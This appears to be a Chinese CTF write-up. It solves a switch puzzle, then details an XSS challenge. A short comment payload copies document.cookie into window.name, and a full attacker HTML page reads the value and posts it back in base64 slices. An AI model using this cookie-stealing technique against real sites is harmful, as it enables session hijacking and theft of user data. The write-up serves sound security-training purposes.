![1b6f02f652077b8408d37f7ec74080bb.png](_resources/1b6f02f652077b8408d37f7ec74080bb.png)

`01110111`

第三组：
完全不熟悉游戏，也只能靠猜
![e41124e82d74bb0e3714424423c1e92b.png](_resources/e41124e82d74bb0e3714424423c1e92b.png)
![f6c457dbf2ded67a36a7c92cbb3961a1.png](_resources/f6c457dbf2ded67a36a7c92cbb3961a1.png)
红框三个不能打开，sw3为0时，反应堆启动，sw8一定要与sw9一致，否则就会自爆，其他的要打开。
所以是`10001100`

组合一下：`10100101110001001000110001110111`

`flag{B34WarE_0f_#xp1osi0N_da2120aad4}`


## 微积分计算小练习 2.0

为了实现跨域传输数据，传统的打开弹窗然后读取弹窗内容是行不通的，因为由于不是同一域名，浏览器会禁止读取弹窗中的内容。

但是，在同一个页面中，`window.name`是共享的，也就是说，我们可以将需要传输的数据存在`window.name`中（简写就是`name`），然后由我们自编写的网站来读取。

首先我们发现，评论存在XSS注入的可能性，即评论是简单的字符串拼接，因此，我们只需提前结束字符串即可编写自己的代码。

我们需要得到的是网站的`cookie`，所以可以用`name=document.cookie`将cookie放在`name`中，但是由于评论长度只有`25`，同时禁用了`.`，因此，`"[name=document["cookie"]+"`太长了，没法发送，不过，我们可以将`cookie`放在`name`里，然后提交`"[name=document[name]]+"`，这样就刚刚好了。

接下来，只需要控制新开的页面访问我们自己编写的网站，然后提交得到的flag就可以啦。（不过记得先base64编码，然后切片提交）

下面是HTML代码：
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<form action="http://web/result" method="post">
    <input id="flag" name="comment" type="text"/>
    <input id="submit" type="submit" value="提交"/>
</form>


<script>
    const stage = new URLSearchParams(window.location.search).get('stage');

    // 第一阶段，设置自己的name为cookie
    if (stage === "1") {
        window.name = "cookie";
        document.getElementById("flag").value = `"[name=document[name]]+"`;
        document.getElementById("submit").click();
    }

    // 第二阶段，将当前的name提交到服务器
    if (stage === "2") {
        const data = btoa(window.name); // 76
        document.getElementById("flag").value = data.slice(50, 75);
        document.getElementById("submit").click();
    }

    // 第零阶段，作为宿主页面，新开一个窗口，展示stage=1的页面
    if (!stage) {
        let newWindow = window.open(location.href + "?stage=1");
        setTimeout(() => {
            newWindow.location.replace(location.href + "?stage=2")
        }, 1000)
    }
</script>
</body>
</html>


EOF
```

最后拼接出来的flag用`urllib.parse.unquote_plus`去转义，便可以拿到flag。

`flag{x55_still_alive&=>_< _a765e18e3c}`